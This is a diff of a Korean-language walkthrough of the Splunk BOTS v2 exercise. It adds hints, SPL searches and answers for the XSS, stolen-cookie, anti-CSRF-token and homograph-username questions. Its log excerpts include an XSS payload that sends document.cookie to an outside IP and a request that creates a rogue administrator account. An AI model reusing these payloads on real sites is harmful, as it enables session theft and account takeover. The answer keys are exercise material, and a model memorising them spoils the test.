@@ -299,11 +299,33 @@ berwertalk.com에서 btun의 비밀번호는 무엇입니까 ?
   <summary>hint#4</summary>
 
 </details>
+
+해당 질문은 현 실습 환경에서 제공되지 않는 Splunk ES에서 확인할 수 있는것으로 문제풀이는 하지않겠습니다.
+
 206	What are the characters displayed by the XSS probe? Answer guidance: Submit answer in native language or character set.
+XSS 프로브가 표시하는 문자는 무엇입니까? 답변 안내: 현지어 또는 문자 집합으로 답변을 제출합니다.
 
 <details>
   <summary>hint#1</summary>
+    The attack is obscured in the logs by URL encoding.
+    공격은 URL 인코딩에 의해 로그에서 가려집니다.
+</details>
 
+<details>
+  <summary>hint#2</summary>
+    Splunk has the capability to URLdecode strings. Check your quick reference guide or Google for it.
+    Splunk에는 문자열을 URL 디코딩하는 기능이 있습니다. 빠른 참조 가이드 또는 Google을 확인하십시오.
+</details>
+
+<details>
+  <summary>hint#3</summary>
+    Try using | eval decoded_uri=urldecode(uri)
+    다음 SPL을 사용해보세요 | eval decoded_uri=urldecode(uri)
+</details>
+<details>
+  <summary>hint#4</summary>
+    Don't forget to check if others on your team have investigated this before.
+    팀의 다른 사람들이 전에 이것을 조사했는지 확인해보세요.
 </details>
 
 XSS공격은 script를 이용한 공격입니다. 키워드 script가 있는 form_data를 조사해봅시다. 
@@ -321,7 +343,8 @@ sourcetype=stream:http "<script>"
 |2017/08/15 23:36:34.915|action=activate&uid=-1&code=%22%3E%3Cscript%3Edocument.location%3D%22http%3A%2F%2F45.77.65.211%3A9999%2Fmicrosoftuserfeedbackservice%3Fmetric%3D%22%20%2B%20document.cookie%3B%3C%2Fscript%3E|71.39.18.125|
 |2017/08/12 09:49:00.520|action=activate&uid=-1&code=%22%3E%3Cscript%3Ealert(%27%EB%8C%80%EB%8F%99%27)%3C%2Fscript%3E|136.0.0.125|
 
-내용이 base64인코딩되어 있습니다. 
+내용이 base64인코딩되어 있습니다. urldecode함수를 통해 디코딩해봅시다.
+
 ```
 sourcetype=stream:http "<script>"
 | dedup form_data
@@ -356,11 +379,19 @@ window.onload=function(e){
 
 답 : 대동
 
-207	What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of a XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.
+207	What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of a XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.  
+XSS 공격의 일환으로 Kevin의 브라우저가 악성 URL에 전송한 쿠키의 가치는 무엇이었습니까? 답변 안내: 모두 숫자입니다. 쿠키 이름이나 등호와 같은 기호가 아닙니다.
 
 <details>
   <summary>hint#1</summary>
+    Check out sourcetype=stream:http
+    sourcetype stream:http를 확인해보세요.
+</details>
 
+<details>
+  <summary>hint#2</summary>
+    Inspect the uri_query field.
+    uri_query 필드를 검사합니다.
 </details>
 
 kevin의 브라우저에서 XSS공격으로 인한 쿠키값이 탈취되었습니다. 키워드 kevin, "<\script>", cookie를 넣어 검색해 봅시다.
@@ -388,264 +419,78 @@ brewertalk.com 웹 사이트는 CSRF(Cross Site Request Forgery) 기술을 사�
 
 <details>
   <summary>hint#1</summary>
-
+    Anti-CSRF tokens are usually hidden form elements set when the browser loads an HTML page containing a form. If the form is submitted without the anti-CSRF token, the backend code of the website rejects the transaction as it might have come from a malicious source rather than from a legitimate user of the form.<br>
+    Anti-CSRF 토큰은 일반적으로 브라우저가 양식을 포함하는 HTML 페이지를 로드할 때 설정된 숨겨진 양식 요소입니다. 안티 CSRF 토큰 없이 양식을 제출하는 경우 웹사이트의 백엔드 코드는 해당 양식의 합법적인 사용자가 아닌 악의적인 소스에서 온 것일 수 있으므로 트랜잭션을 거부합니다.
 </details>
+<details>
+  <summary>hint#2</summary>
+    One of the many ways that an attacker can abuse a cross site scripting vulnerability is to use it to defeat CSRF protections. If you carefully inspect XSS attacks in the data set, you will stumble on some malicious code that is stealing the anti-CSRF token.<br>
+    공격자가 크로스 사이트 스크립팅 취약점을 악용할 수 있는 여러 방법 중 하나는 이를 사용하여 CSRF 보호를 무력화하는 것입니다. 데이터 셋에서 XSS 공격을 주의 깊게 검사하면 anti-CSRF token을 훔치는 일부 악성 코드를 발견하게 될 것입니다.
+</details>
+
+<details>
+  <summary>hint#3</summary>
+    On brewertalk.com, users created with usergroup=4 are administrators.<br>
+    brewertalk.com에서 usergroup=4로 생성된 사용자는 관리자입니다.
+</details>
+
 CSRF 토큰이란, CSRF공격 대응하기 위해 클라이언트에서 서버로 요청할때 실제 서버에서 허용한 요청이 맞는지 확인하기 위한 값을 말합니다.
 
 [csrf 토큰이란?](https://codevang.tistory.com/282)
 
-"input type="hidden" name="my_post_key" value="1bc3eab741900ab25c98eee86bf20feb"
+```
+sourcetype="stream:http" 
+| reverse 
+| search "input type="hidden""
+```
+
+아래 결과를 발견할 수 있습니다.
+input type="hidden" name="my_post_key" value="1bc3eab741900ab25c98eee86bf20feb
+
+```
+sourcetype="stream:http" 1bc3eab741900ab25c98eee86bf20feb 
+| reverse
+| table form_data
+```
+아래와 같이 조회 됩니다.
+
+my_post_key=1bc3eab741900ab25c98eee86bf20feb&username=kIagerfield&password=beer_lulz&confirm_password=beer_lulz&email=kIagerfield@froth.ly&usergroup=4&additionalgroups[]=4&displaygroup=4
 
 답 : 1bc3eab741900ab25c98eee86bf20feb
 
-209	What brewertalk.com username was maliciously created by a spearphishing attack?
+209	What brewertalk.com username was maliciously created by a spearphishing attack?  
+스피어피싱 공격에 의해 악의적으로 생성된 brewertalk.com 사용자 이름은 무엇입니까?
 
 <details>
   <summary>hint#1</summary>
-
+    The attacker was trying to masquerade as something that would look legitimate to a casual observer.<br>
+    공격자는 평범한 관찰자에게 합법적으로 보이는 것으로 가장하려고 했습니다.
 </details>
-
-300	According to Frothly's records, what is the likely MAC address of Mallory's corporate MacBook? Answer guidance: Her corporate MacBook has the hostname MACLORY-AIR13.
 
 <details>
-  <summary>hint#1</summary>
-
+  <summary>hint#2</summary>
+    The attacker stole a trick from domain squatters by using a homograph attack. More info on homograph attacks can be found on Wikipedia.<br>
+    공격자는 동형이의어(homograph) 공격을 사용하여 도메인 점거자로부터 속임수를 훔쳤습니다. 동형 이의어 공격에 대한 자세한 내용은 Wikipedia에서 찾을 수 있습니다.
 </details>
-
-301	What episode of Game of Thrones is Mallory excited to watch? Answer guidance: Submit the HBO title of the episode.
 
 <details>
-  <summary>hint#1</summary>
-
+  <summary>hint#3</summary>
+    The password of this new, unauthorized, malicious administrative account is beer_lulz.<br>
+    새로운 승인되지 않은 악의적인 관리 계정의 암호는 beer_lulz입니다.
 </details>
 
-302	What is Mallory Krauesen's phone number? Answer guidance: ddd-ddd-dddd where d=[0-9]. No country code.
+스피어 피싱(spear phishing)이란, 특정한 개인이나 회사들을 대상으로 시도하는 피싱을 스피어 피싱입니다.
 
-<details>
-  <summary>hint#1</summary>
+힌트#3을 보면 계정의 암호는 "beer_lulz"입니다. 해당 암호를 키워드로 검색해봅니다.
 
-</details>
+```
+sourcetype="stream:http" beer_lulz
+```
 
-303	Enterprise Security contains a threat list notable event for MACLORY-AIR13 and suspect IP address 5.39.93.112. What is the name of the threatlist (i.e. Threat Group) that is triggering the notable?
+form_data필드 값이 아래와 같습니다.
+form_data: username=kIagerfield&password=beer_lulz&do=login
 
-<details>
-  <summary>hint#1</summary>
+유저이름은 kIagerfield입니다.
+힌트#2에서 [동형이의어 공격](https://ko.wikiqube.net/wiki/IDN_homograph_attack)을 사용했다고 알려주었으므로, 원래 이름은 두번째글자에서 대문자 I가 아닌, 소문자 l일 가능성이 높습니다.
 
-</details>
-
-304	Considering the threatlist you found in the question above, and related data, what protocol often used for file transfer is actually responsible for the generated traffic?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-305	Mallory's critical PowerPoint presentation on her MacBook gets encrypted by ransomware on August 18. At what hour, minute, and second does this actually happen? Answer guidance: Provide the time in PDT. Use the 24h format HH:MM:SS, using leading zeroes if needed. Do not use Splunk's _time (index time).
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-~~~
-PDT(Pacific Daylight Time)
-출처 : https://luran.me/339
-~~~
-
-306	How many seconds elapsed between the time the ransomware executable was written to disk on MACLORY-AIR13 and the first local file encryption? Answer guidance: Use the index times (_time) instead of other timestamps in the events.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-307	Kevin Lagerfield used a USB drive to move malware onto kutekitten, Mallory's personal MacBook. She ran the malware, which obfuscates itself during execution. Provide the vendor name of the USB drive Kevin likely used. Answer Guidance: Use time correlation to identify the USB drive.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-308	What programming language is at least part of the malware from the question above written in?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-309	The malware from the two questions above appears as a specific process name in the process table when it is running. What is it?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-310	The malware infecting kutekitten uses dynamic DNS destinations to communicate with two C&C servers shortly after installation. What is the fully-qualified domain name (FQDN) of the first (alphabetically) of these destinations?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-311	From the question above, what is the fully-qualified domain name (FQDN) of the second (alphabetically) contacted C&C server?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-312	What is the average Alexa 1M rank of the domains between August 18 and August 19 that MACLORY-AIR13 tries to resolve while connected via VPN to the corporate network? Answer guidance: Round to two decimal places. Remember to include domains with no rank in your average! Answer example: 3.23 or 223234.91
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-
-313	Two .jpg-formatted photos of Mallory exist in Kevin Lagerfield's server home directory that have eight-character file names, not counting the .jpg extension. Both photos were encrypted by the ransomware. One of the photos can be downloaded at the following link, replacing 8CHARACTERS with the eight characters from the file name. https://splunk.box.com/v/8CHARACTERS After you download the file to your computer, decrypt the file using the encryption key used by the ransomware. What is the complete line of text in the photo, including any punctuation? Answer guidance: The encryption key can be found in Splunk.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-400	A Federal law enforcement agency reports that Taedonggang often spearphishes its victims with zip files that have to be opened with a password. What is the name of the attachment sent to Frothly by a malicious Taedonggang actor?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-401	The Taedonggang APT group encrypts most of their traffic with SSL. What is the "SSL Issuer" that they use for the majority of their traffic? Answer guidance: Copy the field exactly, including spaces.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-402	Threat indicators for a specific file triggered notable events on two distinct workstations. What IP address did both workstations have a connection with?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-403	Based on the IP address found in question 402, what domain of interest is associated with that IP address?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-404	What unusual file (for an American company) does winsys32.dll cause to be downloaded into the Frothly environment?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-405	What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim's workstation? Answer example: John Smith
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-406	What is the average Shannon entropy score of the subdomain containing UDP-exfiltrated data? Answer guidance: Cut off, not rounded, to the first decimal place. Answer examples: 3.2 or 223234.9
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-
-407	To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer guidance: Remove the path and type a single value with an extension. Answer example: index.php or images.html
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-408	The APT group Taedonggang is always building more infrastructure to attack future victims. Provide the IPV4 IP address of a Taedonggang controlled server that has a completely different first octet to other Taedonggang controlled infrastructure. Answer guidance: 4.4.4.4 has a different first octet than 8.4.4.4
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-409	The Taedonggang group had several issues exfiltrating data. Determine how many bytes were successfully transferred in their final, mostly successful attempt to exfiltrate files via a method using TCP, using only the data available in Splunk logs. Use 1024 for byte conversion.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-500	Individual clicks made by a user when interacting with a website are associated with each other using session identifiers. You can find session identifiers in the stream:http sourcetype. The Frothly store website session identifier is found in one of the stream:http fields and does not change throughout the user session. What session identifier is assigned to dberry398@mail.com when visiting the Frothly store for the very first time? Answer guidance: Provide the value of the field, not the field name.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-501	How many unique user ids are associated with a grand total order of $1000 or more?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-502	Which user, identified by their email address, edited their profile before placing an order over $1000 in the same clickstream? Answer guidance: Provide the user ID, not other values found from the profile edit, such as name.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-503	What street address was used most often as the shipping address across multiple accounts, when the billing address does not match the shipping address? Answer example: 123 Sesame St
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-504	What is the domain name used in email addresses by someone creating multiple accounts on the Frothly store website (http://store.froth.ly) that appear to have machine-generated usernames?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-505	Which user ID experienced the most logins to their account from different IP address and user agent combinations? Answer guidance: The user ID is an email address.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-506	What is the most popular coupon code being used successfully on the site?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-507	Several user accounts sharing a common password is usually a precursor to undesirable scenario orchestrated by a fraudster. Which password is being seen most often across users logging into http://store.froth.ly.
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-508	Which HTML page was most clicked by users before landing on http://store.froth.ly/magento2/checkout/ on August 19th? Answer guidance: Use earliest=1503126000 and latest=1503212400 to identify August 19th. Answer example: http://store.froth.ly/magento2/bigbrew.html
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
-
-509	Which HTTP user agent is associated with a fraudster who appears to be gaming the site by unsuccessfully testing multiple coupon codes?
-
-<details>
-  <summary>hint#1</summary>
-
-</details>
+답 : kIagerfield
